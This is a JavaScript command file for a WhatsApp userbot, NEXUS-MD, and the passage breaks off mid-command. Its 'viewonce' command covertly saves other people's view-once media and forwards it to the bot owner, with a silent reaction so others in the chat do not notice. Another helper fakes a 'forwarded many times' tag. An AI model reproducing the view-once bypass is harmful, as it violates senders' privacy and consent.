const { Sticker, StickerTypes } = require('wa-sticker-formatter');
const { MENU_IMAGE_URL, CHANNEL_CODE, CHANNEL_NAME, DEFAULT_PREFIX, DEFAULT_MENU_STYLE } = require('../config');
const { getGroupSettings, setGroupSetting, getGlobalSetting, setGlobalSetting } = require('../store');
const { isSenderAdmin } = require('../moderation');
const {
  generateWAMessageFromContent,
  proto,
  generateWAMessage,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  downloadMediaMessage
} = require('@whiskeysockets/baileys');





// ==========================================
//        PRINCE API HELPER & CONSTANTS
// ==========================================
const P_KEY = 'prince';
const P_BASE = 'https://api.princetechn.com/api';
/**
 * Helper to handle media downloads to reduce repetitive code
 */
const princeDownload = async (sock, from, url, path, type = 'video') => {
  try {
    await sock.sendMessage(from, { text: `📥 *Processing ${type}...* Please wait.` });
    const res = await fetch(`${P_BASE}/download/${path}?apikey=${P_KEY}&url=${encodeURIComponent(url)}`);
    const data = await res.json();
    const link = data.result?.url || data.result?.download_url || data.url || data.result;

    if (!link) return sock.sendMessage(from, { text: "❌ Failed to fetch download link." });

    if (type === 'video') {
      await sock.sendMessage(from, { video: { url: link }, caption: `✅ *NEXUS-MD Download Success*`, mimetype: 'video/mp4' });
    } else {
      await sock.sendMessage(from, { audio: { url: link }, mimetype: 'audio/mpeg', fileName: 'audio.mp3' });
    }
  } catch (e) {
    sock.sendMessage(from, { text: "⚠️ Download Error: " + e.message });
  }
};


const BOT_NAME = 'NEXUS-MD';
// Fallback shown in help text before a session sets its own prefix with .setprefix.
const PREFIX = DEFAULT_PREFIX;
const START_TIME = Date.now();

// Category display order + icons for the menu.
const CATEGORY_STYLE = {
  MAIN: '🏠',
  INFO: 'ℹ️',
  TOOLS: '🛠️',
  AI: '🤖',
  DOWNLOADER: '📥',
  'GROUP-ADMIN': '👥',
  'GROUP-SECURITY': '🛡️',
  NSFW: '🔞',
  BUGS: '🐛'  // Added bugs category with bug emoji
};

const CATEGORY_ORDER = [
  'MAIN', 
  'AI', 
  'DOWNLOADER', 
  'INFO', 
  'TOOLS', 
  'GROUP-ADMIN', 
  'GROUP-SECURITY', 
  'NSFW', 
  'BUGS'  // Added bugs category at the end
];

function greeting() {
  const h = new Date().getHours();
  if (h < 5) return 'Still up? 🌙';
  if (h < 12) return 'Good morning ☀️';
  if (h < 18) return 'Good afternoon 🌤️';
  return 'Good evening 🌆';
}

/**
 * Each command: { name, aliases, category, description, execute(ctx) }
 * ctx = { sock, msg, from, sender, args, text, isGroup, sessionId, quoted }
 */
const commands = new Map();

function register(cmd) {
  commands.set(cmd.name, cmd);
  (cmd.aliases || []).forEach((a) => commands.set(a, cmd));
}

function formatUptime(ms) {
  const s = Math.floor(ms / 1000);
  const h = Math.floor(s / 3600);
  const m = Math.floor((s % 3600) / 60);
  const sec = s % 60;
  return `${h}h ${m}m ${sec}s`;
}

// Builds the contextInfo that makes a message display as "Forwarded many
// times" from the bot's channel — the little forwarded tag WhatsApp shows
// above a message, linking back to CHANNEL_NAME. Returns {} (no tag) if no
// channel is configured, so callers can always spread this in safely.
function channelContext() {
  if (!CHANNEL_CODE) return {};
  return {
    contextInfo: {
      isForwarded: true,
      forwardingScore: 999,
      forwardedNewsletterMessageInfo: {
        newsletterJid: `${CHANNEL_CODE}@newsletter`,
        newsletterName: CHANNEL_NAME,
        serverMessageId: 143,
      },
    },
  };
}
// ==========================================
//          MEDIA CONVERSION COMMANDS
// ==========================================

// Helper function to get the owner JID for THIS session.
// Each session belongs to whoever paired their own WhatsApp number to it, so the
// owner is always that linked account itself — never a number baked into the code.
// OWNER_NUMBER is only used as a last-resort fallback if the socket isn't ready yet.
function getOwnerJid(sock) {
  const linkedId = sock?.user?.id;
  if (linkedId) {
    // Baileys ids can come as "1234567890:12@s.whatsapp.net" — strip the device suffix.
    const bare = linkedId.split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
    return `${bare}@s.whatsapp.net`;
  }
  const owner = process.env.OWNER_NUMBER || '';
  return owner ? `${owner.replace(/[^0-9]/g, '')}@s.whatsapp.net` : null;
}

// ==========================================
//          AUTO-BIO ON DEPLOY
// ==========================================

// Auto-bio function to run when the bot starts
async function setAutoBio(sock) {
  try {
    const now = new Date();
    const date = now.toLocaleDateString('en-US', { 
      weekday: 'long', 
      day: 'numeric', 
      month: 'long', 
      year: 'numeric' 
    });
    const time = now.toLocaleTimeString('en-US', { 
      hour: '2-digit', 
      minute: '2-digit',
      hour12: true 
    });
    
    // Get uptime
    const uptime = formatUptime(Date.now() - START_TIME);
    
    // Get RAM usage
    const mem = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1);
    
    // Get total commands count
    const totalCommands = new Set(commands.values()).size;
    
    // Build the bio message
    const bio = [
      `🤖 ${BOT_NAME} | Online ✅`,
      `📅 ${date}`,
      `⏱️ ${time}`,
      `⚡ ${uptime}`,
      `📦 ${totalCommands} commands`,
      `💾 ${mem}MB RAM`
    ].join(' • ');
    
    // Update the profile status (bio)
    await sock.updateProfileStatus(bio);
    
    console.log(`✅ Auto-bio set: ${bio}`);
    
    // Also send a notification to the owner
    const ownerJid = getOwnerJid(sock);
    try {
      await sock.sendMessage(ownerJid, {
        text: `✅ *Bot Deployed Successfully*\n\n📱 *Status:* Online\n📅 *Date:* ${date}\n⏱️ *Time:* ${time}\n⏱️ *Uptime:* ${uptime}\n📦 *Commands:* ${totalCommands}\n💾 *RAM:* ${mem}MB\n\n📝 *Bio:* ${bio}`
      });
    } catch (e) {
      // Ignore if owner not available
    }
    
  } catch (error) {
    console.error('Auto-bio error:', error);
  }
}





// Auto-bio command - manual trigger for updating bio
register({
  name: 'autobio',
  aliases: ['setbio', 'updatebio', 'bio'],
  category: 'MAIN',
  description: 'Set or update the bot\'s profile bio/status',
  async execute({ sock, from, args, msg, prefix, command }) {
    // Owner only command
    const ownerJid = getOwnerJid(sock);
    const isOwner = from === ownerJid || msg.key.fromMe;

    if (!isOwner) {
      return await sock.sendMessage(from, { 
        text: `❌ *Owner only command.*\n\nOnly the bot owner can update the bio.` 
      });
    }

    // Check if user provided custom bio
    if (args[0]) {
      const customBio = args.join(' ');
      
      try {
        await sock.updateProfileStatus(customBio);
        await sock.sendMessage(from, { 
          text: `✅ *Bio Updated*\n\n📝 ${customBio}` 
        });
        return;
      } catch (error) {
        await sock.sendMessage(from, { 
          text: `⚠️ Error updating bio: ${error.message}` 
        });
        return;
      }
    }

    // Auto-generate bio
    await sock.sendMessage(from, { text: `⏳ Generating and updating bio...` });

    try {
      const now = new Date();
      const date = now.toLocaleDateString('en-US', { 
        weekday: 'long', 
        day: 'numeric', 
        month: 'long', 
        year: 'numeric' 
      });
      const time = now.toLocaleTimeString('en-US', { 
        hour: '2-digit', 
        minute: '2-digit',
        hour12: true 
      });
      
      const uptime = formatUptime(Date.now() - START_TIME);
      const mem = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(1);
      const totalCommands = new Set(commands.values()).size;
      
      const bio = [
        `🤖 ${BOT_NAME} | Online ✅`,
        `📅 ${date}`,
        `⏱️ ${time}`,
        `⚡ ${uptime}`,
        `📦 ${totalCommands} commands`,
        `💾 ${mem}MB RAM`
      ].join(' • ');
      
      await sock.updateProfileStatus(bio);
      
      await sock.sendMessage(from, { 
        text: `✅ *Bio Updated*\n\n📝 ${bio}` 
      });
      
    } catch (error) {
      console.error('Auto-bio command error:', error);
      await sock.sendMessage(from, { 
        text: `⚠️ Error updating bio: ${error.message || 'Unknown error'}` 
      });
    }
  }
});


// -------------------- TO IMAGE --------------------
register({
  name: 'togif',
  aliases: ['gif', 'togifconvert', 'makegif'],
  category: 'TOOLS',
  description: 'Convert sticker/video to GIF and send to owner',
  async execute({ sock, from, msg, quoted, prefix, command }) {
    const target = quoted || msg;
    
    // ==========================================================
    // FIX: Better mime detection - check multiple locations
    // ==========================================================
    let mime = '';
    let isSticker = false;
    let isVideo = false;
    let isGif = false;

    // Check sticker message
    if (target.message?.stickerMessage) {
      mime = target.message.stickerMessage.mimetype || 'image/webp';
      isSticker = true;
    }
    // Check video message
    else if (target.message?.videoMessage) {
      mime = target.message.videoMessage.mimetype || 'video/mp4';
      isVideo = true;
      // Check if it's a GIF
      if (target.message.videoMessage.gifPlayback || mime.includes('gif')) {
        isGif = true;
      }
    }
    // Check image message (could be a webp sticker)
    else if (target.message?.imageMessage) {
      mime = target.message.imageMessage.mimetype || '';
      if (mime.includes('webp')) isSticker = true;
    }
    // Check document message
    else if (target.message?.documentMessage) {
      mime = target.message.documentMessage.mimetype || '';
      if (mime.includes('webp')) isSticker = true;
    }
    // Check quoted message
    else if (quoted?.message?.stickerMessage) {
      mime = quoted.message.stickerMessage.mimetype || 'image/webp';
      isSticker = true;
    }
    else if (quoted?.message?.videoMessage) {
      mime = quoted.message.videoMessage.mimetype || 'video/mp4';
      isVideo = true;
    }
    // Fallback: check target.mimetype
    else if (target.mimetype) {
      mime = target.mimetype;
      if (mime.includes('webp')) isSticker = true;
      if (mime.includes('video')) isVideo = true;
      if (mime.includes('gif')) isGif = true;
    }

    const cmdPrefix = prefix || PREFIX;
    const cmdName = command || 'togif';

    // Check if any valid media type was detected
    if (!isSticker && !isVideo && !isGif && !mime.includes('webp') && !mime.includes('video')) {
      await sock.sendMessage(from, { 
        text: `❌ Reply to a *sticker* or *video* with: ${cmdPrefix}${cmdName}\n\nDetected: ${mime || 'unknown'}` 
      });
      return;
    }

    await sock.sendMessage(from, { text: `⏳ Converting to GIF...` });

    try {
      // ==========================================================
      // FIX: Better download method
      // ==========================================================
      const { downloadMediaMessage } = require('@whiskeysockets/baileys');
      
      let mediaBuffer = null;
      
      try {
        mediaBuffer = await downloadMediaMessage(
          target.message || target,
          'buffer',
          {},
          { reuploadRequest: sock.updateMediaMessage }
        );
      } catch (dlErr) {
        // Fallback: try the old method
        mediaBuffer = await sock.downloadMediaMessage(target);
      }

      if (!mediaBuffer || mediaBuffer.length < 100) {
        return await sock.sendMessage(from, { text: `❌ Failed to download media.` });
      }

      let gifBuffer = mediaBuffer;
      let isConverted = false;

      // ==========================================================
      // Convert sticker/webp to GIF
      // ==========================================================
      if (isSticker || mime.includes('webp')) {
        try {
          const ffmpeg = require('ffmpeg-static');
          const { exec } = require('child_process');
          const fs = require('fs');
          const path = require('path');
          
          const tmpDir = path.join(process.cwd(), 'tmp');
          if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir, { recursive: true });
          
          const inputPath = path.join(tmpDir, `sticker_${Date.now()}.webp`);
          const outputPath = path.join(tmpDir, `gif_${Date.now()}.gif`);
          
          fs.writeFileSync(inputPath, mediaBuffer);
          
          await new Promise((resolve, reject) => {
            exec(`"${ffmpeg}" -i "${inputPath}" -vf "fps=15,scale=512:512:force_original_aspect_ratio=decrease" -loop 0 "${outputPath}"`, (error) => {
              if (error) reject(error);
              else resolve();
            });
          });
          
          gifBuffer = fs.readFileSync(outputPath);
          try { fs.unlinkSync(inputPath); } catch {}
          try { fs.unlinkSync(outputPath); } catch {}
          isConverted = true;
        } catch (convErr) {
          console.warn('Sticker to GIF conversion failed:', convErr.message);
        }
      }

      // ==========================================================
      // Convert video to GIF
      // ==========================================================
      if ((isVideo || mime.includes('video')) && !isConverted) {
        try {
          const ffmpeg = require('ffmpeg-static');
          const { exec } = require('child_process');
          const fs = require('fs');
          const path = require('path');
          
          const tmpDir = path.join(process.cwd(), 'tmp');
          if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir, { recursive: true });
          
          const inputPath = path.join(tmpDir, `video_${Date.now()}.mp4`);
          const outputPath = path.join(tmpDir, `gif_${Date.now()}.gif`);
          
          fs.writeFileSync(inputPath, mediaBuffer);
          
          await new Promise((resolve, reject) => {
            exec(`"${ffmpeg}" -i "${inputPath}" -vf "fps=15,scale=512:512:force_original_aspect_ratio=decrease" -loop 0 "${outputPath}"`, (error) => {
              if (error) reject(error);
              else resolve();
            });
          });
          
          gifBuffer = fs.readFileSync(outputPath);
          try { fs.unlinkSync(inputPath); } catch {}
          try { fs.unlinkSync(outputPath); } catch {}
          isConverted = true;
        } catch (convErr) {
          console.warn('Video to GIF conversion failed:', convErr.message);
        }
      }

      if (!gifBuffer || gifBuffer.length < 100) {
        return await sock.sendMessage(from, { text: `❌ Failed to convert to GIF.` });
      }

      const ownerJid = getOwnerJid(sock);

      await sock.sendMessage(ownerJid, {
        video: gifBuffer,
        mimetype: 'video/mp4',
        gifPlayback: true,
        caption: `🎬 *Converted to GIF*\n📦 *Size:* ${(gifBuffer.length / 1024).toFixed(1)} KB`
      });

      await sock.sendMessage(from, { 
        text: `✅ Converted to GIF and sent to owner's chat.\n📤 *Sent to:* ${ownerJid.split('@')[0]}` 
      });

    } catch (error) {
      console.error('To GIF error:', error);
      await sock.sendMessage(from, { text: `⚠️ Error: ${error.message || 'Could not convert to GIF.'}` });
    }
  }
});

// -------------------- VIEWONCE --------------------
register({
  name: 'viewonce',
  aliases: ['vo', 'once', 'viewonceimg', 'vv', 'vv2'],
  category: 'TOOLS',
  description: 'Download view-once media and send to owner',
  async execute({ sock, from, msg, quoted, prefix, command }) {
    const target = quoted || msg;
    const cmdPrefix = prefix || PREFIX;
    const cmdName = command || 'viewonce';

    const msgKeys = Object.keys(target.message || {});
    // Two shapes exist in the wild: an explicit wrapper (viewOnceMessage /
    // viewOnceMessageV2 / viewOnceMessageV2Extension), or — far more common on
    // recent WhatsApp clients — no wrapper at all, just a plain imageMessage/
    // videoMessage/audioMessage with a `viewOnce: true` flag set directly on it.
    // The old check only looked for the wrapper, so it missed that second case.
    const wrapped = msgKeys.some(k => k.toLowerCase().includes('viewonce'));
    const unwrapped = ['imageMessage', 'videoMessage', 'audioMessage'].some(
      (t) => target.message?.[t]?.viewOnce
    );
    const isViewOnce = wrapped || unwrapped;

    if (!isViewOnce) {
      return await sock.sendMessage(from, { 
        text: `❌ Reply to a view-once message with: ${cmdPrefix}${cmdName}\n\n*Note:* You must reply to a view-once image or video.` 
      });
    }

    try {
      let mediaMessage = target.message;
      
      if (mediaMessage.viewOnceMessageV2) {
        mediaMessage = mediaMessage.viewOnceMessageV2.message;
      } else if (mediaMessage.viewOnceMessageV2Extension) {
        mediaMessage = mediaMessage.viewOnceMessageV2Extension.message;
      } else if (mediaMessage.viewOnceMessage) {
        mediaMessage = mediaMessage.viewOnceMessage.message;
      }

      const mediaTypes = ['imageMessage', 'videoMessage', 'audioMessage', 'documentMessage'];
      let mediaType = null;
      let mediaData = null;

      for (const type of mediaTypes) {
        if (mediaMessage[type]) {
          mediaType = type;
          mediaData = mediaMessage[type];
          break;
        }
      }

      if (!mediaData) {
        return await sock.sendMessage(from, { text: `❌ Could not extract media from view-once message.` });
      }

      // `downloadMediaMessage` is a standalone helper exported by Baileys — it is
      // NOT a method on the socket. Calling sock.downloadMediaMessage(...) throws
      // "not a function" every time, which is why this command was failing.
      const mediaBuffer = await downloadMediaMessage(
        { key: target.key, message: mediaMessage },
        'buffer',
        {},
        { reuploadRequest: sock.updateMediaMessage }
      );
      if (!mediaBuffer || mediaBuffer.length < 100) {
        return await sock.sendMessage(from, { text: `❌ Failed to download view-once media.` });
      }

      const ownerJid = getOwnerJid(sock);
      const fileSize = (mediaBuffer.length / 1024 / 1024).toFixed(2);
      const mediaTypeName = mediaType.replace('Message', '').toLowerCase();

      let caption = `👁️ *View-Once Media Saved*\n`;
      caption += `📱 *Type:* ${mediaTypeName}\n`;
      caption += `📦 *Size:* ${fileSize} MB\n`;
      caption += `📅 *Date:* ${new Date().toLocaleString()}\n`;
      caption += `👤 *From:* ${from.split('@')[0]}`;

      if (mediaType === 'imageMessage') {
        await sock.sendMessage(ownerJid, {
          image: mediaBuffer,
          caption: caption
        });
      } else if (mediaType === 'videoMessage') {
        await sock.sendMessage(ownerJid, {
          video: mediaBuffer,
          mimetype: 'video/mp4',
          caption: caption
        });
      } else if (mediaType === 'audioMessage') {
        await sock.sendMessage(ownerJid, {
          audio: mediaBuffer,
          mimetype: 'audio/mpeg',
          fileName: `viewonce_audio_${Date.now()}.mp3`,
          caption: caption
        });
      } else {
        await sock.sendMessage(ownerJid, {
          document: mediaBuffer,
          fileName: `viewonce_${Date.now()}`,
          caption: caption
        });
      }

      // No visible confirmation text in the chat — just react ✅ on the command
      // message so it's silent to anyone else watching that chat.
      await sock.sendMessage(from, {
        react: { text: '✅', key: msg.key }
      });

    } catch (error) {
      console.error('ViewOnce error:', error);
      await sock.sendMessage(from, { text: `⚠️ Error: ${error.message || 'Could not process view-once media.'}` });
    }
  }
});
// ---------- MAIN ----------

const MENU_STYLES = ['classic', 'compact', 'minimal', 'neon', 'elegant'];

function buildMenu(style, { commandPrefix, name, isGroup }) {
  const byCategory = {};
  for (const cmd of new Set(commands.values())) {
    byCategory[cmd.category] = byCategory[cmd.category] || [];
    if (!byCategory[cmd.category].includes(cmd.name)) byCategory[cmd.category].push(cmd.name);
  }

  const totalCommands = new Set(commands.values()).size;
  const uptime = formatUptime(Date.now() - START_TIME);
  const date = new Date().toLocaleDateString('en-US', { weekday: 'long', day: 'numeric', month: 'long' });

  const orderedCats = [
    ...CATEGORY_ORDER.filter((c) => byCategory[c]),
    ...Object.keys(byCategory).filter((c) => !CATEGORY_ORDER.includes(c)),
  ];

  // ---- minimal: just a comma-separated line per category, no header art ----
  if (style === 'minimal') {
    let menu = `🤖 *${BOT_NAME}* — ${totalCommands} commands · prefix [${commandPrefix}]\n\n`;
    for (const cat of orderedCats) {
      const icon = CATEGORY_STYLE[cat] || '📁';
      menu += `${icon} *${cat}*: ${byCategory[cat].map((n) => `${commandPrefix}${n}`).join(', ')}\n\n`;
    }
    menu += `_${BOT_NAME}_`;
    return menu;
  }
  
  // ---- neon: bold, high-contrast, cyberpunk feel ----
  if (style === 'neon') {
    let menu = '';
    menu += `『 🌌 *${BOT_NAME}* 』\n`;
    menu += `▸ ${greeting()}, *${name}* ⚡\n`;
    menu += `▸ 📅 ${date}\n`;
    menu += `▸ ⏱️ Uptime   ➤ ${uptime}\n`;
    menu += `▸ ⚙️ Prefix   ➤ [ ${commandPrefix} ]\n`;
    menu += `▸ 📦 Commands ➤ ${totalCommands}\n`;
    menu += `▸ 🌐 Mode     ➤ ${isGroup ? 'Group' : 'Private'}\n`;
    menu += `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n\n`;

    for (const cat of orderedCats) {
      const names = byCategory[cat];
      const icon = CATEGORY_STYLE[cat] || '📁';
      menu += `『 ${icon} *${cat}* 』\n`;
      names.forEach((n) => {
        menu += `  ➤ ${commandPrefix}${n}\n`;
      });
      menu += `\n`;
    }

    menu += `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n⚡ _${BOT_NAME} · never sleeps_ ⚡`;
    return menu;
  }
  
  // ---- elegant: refined, airy, minimal ornamentation ----
  if (style === 'elegant') {
    let menu = '';
    menu += `┌ ✦ *${BOT_NAME}* ✦\n`;
    menu += `│  ${greeting()}, *${name}*\n`;
    menu += `│  ${date}\n`;
    menu += `└───────────────\n`;
    menu += `   ⏱ Uptime   · ${uptime}\n`;
    menu += `   ⚙ Prefix   · [ ${commandPrefix} ]\n`;
    menu += `   📦 Commands · ${totalCommands}\n`;
    menu += `   🌐 Mode     · ${isGroup ? 'Group' : 'Private'}\n\n`;

    for (const cat of orderedCats) {
      const names = byCategory[cat];
      const icon = CATEGORY_STYLE[cat] || '📁';
      menu += `✦ ${icon} *${cat}*\n`;
      names.forEach((n) => {
        menu += `   · ${commandPrefix}${n}\n`;
      });
      menu += `\n`;
    }

    menu += `─────────────\n✦ _${BOT_NAME}_ ✦`;
    return menu;
  }
  
  

  // ---- compact: flat numbered list, one line per category header ----
  if (style === 'compact') {
    let menu = `*${BOT_NAME}* · ${greeting()} ${name}\n`;
    menu += `⏱️ ${uptime} · ⚙️ [${commandPrefix}] · 📦 ${totalCommands} · 🌐 ${isGroup ? 'Group' : 'Private'}\n`;
    for (const cat of orderedCats) {
      const icon = CATEGORY_STYLE[cat] || '📁';
      menu += `\n${icon} *${cat}*\n`;
      byCategory[cat].forEach((n, i) => {
        menu += `${i + 1}. ${commandPrefix}${n}\n`;
      });
    }
    menu += `\n✨ _Powered by ${BOT_NAME}_`;
    return menu;
  }

  // ---- classic: the original boxed/bordered layout (default) ----
  let menu = '';
  menu += `╭━━━⟪ 🤖 *${BOT_NAME}* ⟫━━━╮\n`;
  menu += `┃ ${greeting()}, *${name}*\n`;
  menu += `┃ 📅 ${date}\n`;
  menu += `┃ ⏱️ Uptime   : ${uptime}\n`;
  menu += `┃ ⚙️ Prefix   : [ ${commandPrefix} ]\n`;
  menu += `┃ 📦 Commands : ${totalCommands}\n`;
  menu += `┃ 🌐 Mode     : ${isGroup ? 'Group' : 'Private'}\n`;
  menu += `╰━━━━━━━━━━━━━━━━━━━━━━╯\n\n`;

  for (const cat of orderedCats) {
    const names = byCategory[cat];
    const icon = CATEGORY_STYLE[cat] || '📁';
    menu += `┌─❰ ${icon} *${cat}* ❱\n`;
    names.forEach((n, i) => {
      const last = i === names.length - 1;
      menu += `│ ${last ? '└' : '├'}⟢ ${commandPrefix}${n}\n`;
    });
    menu += `└──────────────\n\n`;
  }

  menu += `✨ _Powered by ${BOT_NAME} ·Lord zuko_`;
  return menu;
}

register({
  name: 'menu',
  aliases: ['help', 'commands'],
  category: 'MAIN',
  description: 'Show the command menu',
  async execute({ sock, from, sender, isGroup, sessionId, prefix, msg }) {
    const commandPrefix = prefix || getGlobalSetting(sessionId, 'prefix') || PREFIX;
    const style = getGlobalSetting(sessionId, 'menuStyle') || DEFAULT_MENU_STYLE;
    const name = msg?.pushName || sender.split('@')[0];

    const menu = buildMenu(MENU_STYLES.includes(style) ? style : 'classic', {
      commandPrefix,
      name,
      isGroup,
    });

    if (MENU_IMAGE_URL) {
      await sock.sendMessage(from, { image: { url: MENU_IMAGE_URL }, caption: menu, ...channelContext() });
    } else {
      await sock.sendMessage(from, { text: menu, ...channelContext() });
    }
  },
});

register({
  name: 'setprefix',
  category: 'MAIN',
  description: "Change this account's command prefix (owner only)",
  async execute({ sock, from, args, msg, sessionId, prefix }) {
    if (!msg.key.fromMe) {
      return sock.sendMessage(from, { text: '❌ Owner only — link the account and send this command from it.' });
    }
    const current = prefix || getGlobalSetting(sessionId, 'prefix') || PREFIX;
    const newPrefix = args[0];
    if (!newPrefix) {
      return sock.sendMessage(from, {
        text: `⚙️ Current prefix: [ ${current} ]\nUsage: ${current}setprefix <new prefix>\nExample: ${current}setprefix !`,
      });
    }
    if (/\s/.test(newPrefix) || newPrefix.length > 5) {
      return sock.sendMessage(from, { text: '❌ Prefix can\'t contain spaces and must be 5 characters or fewer.' });
    }
    setGlobalSetting(sessionId, 'prefix', newPrefix);
    await sock.sendMessage(from, {
      text: `✅ Prefix changed to [ ${newPrefix} ]\nAll commands now start with *${newPrefix}* — e.g. ${newPrefix}menu`,
    });
  },
});

register({
  name: 'setmenustyle',
  aliases: ['menustyle'],
  category: 'MAIN',
  description: 'Change the .menu layout — classic, compact, or minimal (owner only)',
  async execute({ sock, from, args, msg, sessionId, prefix }) {
    if (!msg.key.fromMe) {
      return sock.sendMessage(from, { text: '❌ Owner only — link the account and send this command from it.' });
    }
    const commandPrefix = prefix || getGlobalSetting(sessionId, 'prefix') || PREFIX;
    const current = getGlobalSetting(sessionId, 'menuStyle') || DEFAULT_MENU_STYLE;
    const style = (args[0] || '').toLowerCase();

    if (!style || !MENU_STYLES.includes(style)) {
      return sock.sendMessage(from, {
        text:
          `🎨 Current menu style: *${current}*\n` +
          `Usage: ${commandPrefix}setmenustyle <style>\n\n` +
          `*Styles:*\n` +
          `• classic — boxed, full stats header (default)\n` +
          `• compact — numbered list per category\n` +
          `• minimal — one comma-separated line per category`,
      });
    }

    setGlobalSetting(sessionId, 'menuStyle', style);
    await sock.sendMessage(from, { text: `✅ Menu style set to *${style}*. Run ${commandPrefix}menu to see it.` });
  },
});
// ==========================================
//               AI COMMANDS
// ==========================================

register({
  name: 'riddle',
  aliases: ['puzzle', 'brainteaser', 'enigma'],
  category: 'TOOLS',
  description: 'Get a random riddle to solve',
  async execute({ sock, from, args, prefix, command }) {
    const arg = (args[0] || '').toLowerCase();

    // Check if user wants the answer
    if (arg === 'answer' || arg === 'ans' || arg === 'reveal') {
      // Check if there's an active riddle
      if (!global.activeRiddle || global.activeRiddle.from !== from) {
        return await sock.sendMessage(from, { 
          text: `❌ No active riddle found. Use ${prefix}${command} to get a new riddle first.` 
        });
      }

      const answer = global.activeRiddle.answer;
      await sock.sendMessage(from, { 
        text: `🧩 *Riddle Answer*\n\n💡 *Answer:* ${answer}\n\n🤫 Don't tell everyone!` 
      });
      return;
    }

    // Show usage if no arguments
    if (args[0] && arg !== 'answer' && arg !== 'ans' && arg !== 'reveal') {
      return await sock.sendMessage(from, { 
        text: `🧩 *Riddle Game*\n\nUsage: ${prefix}${command} - Get a random riddle\n${prefix}${command} answer - Reveal the answer to the current riddle\n\n*Examples:*\n${prefix}${command}\n${prefix}${command} answer` 
      });
    }

    await sock.sendMessage(from, { text: `🧩 Fetching a riddle...` });

    try {
      // Primary: David Cyril API - Riddle Game
      const response = await fetch(
        `https://apis.davidcyril.name.ng/games/riddle`,
        {
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        }
      );

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      // Extract riddle data
      let question = data.result?.question || data.question || data.riddle || data.text;
      let answer = data.result?.answer || data.answer || data.solution;
      let category = data.result?.category || data.category || 'General';
      let difficulty = data.result?.difficulty || data.difficulty || 'Medium';
      let hint = data.result?.hint || data.hint || null;

      if (!question) {
        throw new Error("Could not extract riddle from API response.");
      }

      // Store active riddle for answer retrieval
      global.activeRiddle = {
        from: from,
        question: question,
        answer: answer || 'Hidden',
        category: category,
        difficulty: difficulty,
        timestamp: Date.now()
      };

      // Build the riddle message
      let msg = `🧩 *Riddle Time!*\n\n`;
      msg += `📝 *${question}*\n\n`;
      msg += `📌 *Category:* ${category}\n`;
      msg += `📊 *Difficulty:* ${difficulty}\n\n`;
      msg += `🤔 *Think hard!*\n\n`;
      msg += `💡 Use ${prefix}${command} answer to reveal the answer.`;

      await sock.sendMessage(from, { text: msg });

    } catch (error) {
      console.error('Riddle error:', error);

      // Fallback: Try alternative riddle API
      try {
        const altUrl = 'https://apis.davidcyril.name.ng/games/riddle-v2';
        const altRes = await fetch(altUrl);
        const altData = await altRes.json();

        let altQuestion = altData.result?.question || altData.question || altData.riddle;
        let altAnswer = altData.result?.answer || altData.answer;

        if (altQuestion) {
          global.activeRiddle = {
            from: from,
            question: altQuestion,
            answer: altAnswer || 'Hidden',
            category: altData.result?.category || altData.category || 'General',
            difficulty: altData.result?.difficulty || altData.difficulty || 'Medium',
            timestamp: Date.now()
          };

          let msg = `🧩 *Riddle Time! (fallback)*\n\n`;
          msg += `📝 *${altQuestion}*\n\n`;
          msg += `📌 *Category:* ${altData.result?.category || altData.category || 'General'}\n`;
          msg += `📊 *Difficulty:* ${altData.result?.difficulty || altData.difficulty || 'Medium'}\n\n`;
          msg += `🤔 *Think hard!*\n\n`;
          msg += `💡 Use ${prefix}${command} answer to reveal the answer.`;

          return await sock.sendMessage(from, { text: msg });
        }
      } catch (altErr) {}

      // Fallback: Use a local riddle
      const localRiddles = [
        {
          question: "I speak without a mouth and hear without ears. I have no body, but I come alive with wind. What am I?",
          answer: "An echo",
          category: "Logic",
          difficulty: "Easy"
        },
        {
          question: "The more you take, the more you leave behind. What am I?",
          answer: "Footsteps",
          category: "Classic",
          difficulty: "Easy"
        },
        {
          question: "What has keys but no locks, space but no room, and you can enter but not go in?",
          answer: "A keyboard",
          category: "Technology",
          difficulty: "Medium"
        }
      ];

      const random = localRiddles[Math.floor(Math.random() * localRiddles.length)];
      global.activeRiddle = {
        from: from,
        question: random.question,
        answer: random.answer,
        category: random.category,
        difficulty: random.difficulty,
        timestamp: Date.now()
      };

      let msg = `🧩 *Riddle Time! (local)*\n\n`;
      msg += `📝 *${random.question}*\n\n`;
      msg += `📌 *Category:* ${random.category}\n`;
      msg += `📊 *Difficulty:* ${random.difficulty}\n\n`;
      msg += `🤔 *Think hard!*\n\n`;
      msg += `💡 Use ${prefix}${command} answer to reveal the answer.`;

      await sock.sendMessage(from, { text: msg });
    }
  }
});
register({
  name: 'animequiz',
  aliases: ['aq', 'animeq', 'otakuquiz'],
  category: 'GAMES',
  description: 'Test your anime knowledge with a quiz',
  async execute({ sock, from, args, prefix, command }) {
    const arg = (args[0] || '').toLowerCase();

    // Check if user wants the answer
    if (arg === 'answer' || arg === 'ans' || arg === 'reveal') {
      if (!global.activeAnimeQuiz || global.activeAnimeQuiz.from !== from) {
        return await sock.sendMessage(from, { 
          text: `❌ No active anime quiz found. Use ${prefix}${command} to get a new question first.` 
        });
      }

      const answer = global.activeAnimeQuiz.answer;
      await sock.sendMessage(from, { 
        text: `🎌 *Anime Quiz Answer*\n\n💡 *Answer:* ${answer}\n\n📚 *Category:* ${global.activeAnimeQuiz.category}\n\n🤫 Don't tell everyone!` 
      });
      return;
    }

    // Show usage if no arguments
    if (args[0] && arg !== 'answer' && arg !== 'ans' && arg !== 'reveal') {
      return await sock.sendMessage(from, { 
        text: `🎌 *Anime Quiz Game*\n\nUsage: ${prefix}${command} - Get a random anime quiz\n${prefix}${command} answer - Reveal the answer to the current question\n\n*Examples:*\n${prefix}${command}\n${prefix}${command} answer` 
      });
    }

    await sock.sendMessage(from, { text: `🎌 Generating anime quiz...` });

    try {
      // Primary: David Cyril API - Anime Quiz
      const response = await fetch(
        `https://apis.davidcyril.name.ng/games/anime-quiz`,
        {
